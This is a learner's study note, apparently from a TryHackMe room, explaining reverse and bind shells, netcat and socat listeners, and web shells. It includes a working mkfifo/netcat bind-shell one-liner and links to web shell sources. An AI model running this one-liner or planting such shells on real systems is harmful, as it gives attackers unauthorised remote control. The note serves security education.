---
tags:
  - concept
  - exploitation
  - post-exploitation
link: https://tryhackme.com/room/shellsoverview
prerequisites:
  - "[[Networking MOC]]"
  - "[[Command Line MOC]]"
  - "[[Web Hacking MOC]]"
---
# What is a Shell?
A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.  

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.

- **Remote System Control**: allows the attacker to execute commands or software remotely in the target system.
- **Privilege Escalation**: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
- **Data Exfiltration**: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
- **Persistence and Maintenance Access**: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
- **Post-Exploitation Activities**: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
- **Access Other Systems on the Network**: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.
# Reverse Shell
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.
## How reverse shell works
### setting up a netcat(nc) listener
```shell
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

The command above uses the `-l` option to indicate Netcat to listen or wait for a connection. The `-v` option enables verbose mode. The `-n` option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the `-p` flag indicates the port that will be used to wait for the connection, in the case above, port **443**.

Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like **53**, **80**, **8080**, **443**, **139**, or **445**. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.
### Gaining Reverse Shell Access
Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. 

Once the above payload is executed, the attacker will receive a **reverse shell**, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

```shell
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```
# Bind Shell

> [!NOTE] Port Requirements
> We need to note that ports below 1024 will require Netcat to be executed with elevated privileges

A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

**Example**
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
By running this on the target machine, it exposes a shell to any attacker that connect to the port 8080.
Now that the target machine is waiting for incoming connections, we can use Netcat again to connect.

---
## Core Difference 

The difference is **who initiates the network connection**.

| Shell type        | Who connects?     | Direction |
| ----------------- | ----------------- | --------- |
| **Reverse shell** | Victim → Attacker | Outbound  |
| **Bind shell**    | Attacker → Victim | Inbound   |

Everything else (firewalls, NAT, reliability) flows from this.

For reverse shell, the **target system initiates a connection back to you**, then gives you a shell over that connection.
For bind shell, the **target opens a port and listens**, waiting for you to connect.

| Environment          | Reverse Shell | Bind Shell           |
| -------------------- | ------------- | -------------------- |
| Behind NAT           | Works         | Often fails          |
| Strict firewall      | Likely works  | Likely blocked       |
| Internal LAN         | Works         | Works                |
| Internet-facing host | Works         | Works (if port open) |

---
# Shell Listeners
Some tools that can be used as listeners to interact with an incoming shell include:  
### Rlwrap
It is a small utility that uses the GNU readline library to provide editing keyboard and history.
```shell
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```
### Ncat
Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
```shell
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```
### Socat
It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

```shell
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

The command above used the `-d` option to enable verbose output; using it again (`-d -d`) will increase the verbosity of the commands. The `TCP-LISTEN:443` option creates a TCP listener on port `443`, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.

# Shell Payload
A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
# Web Shell
A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts.

The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time.
- [p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution.
- [b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.      
- [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.      
You can find more web shells at: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).

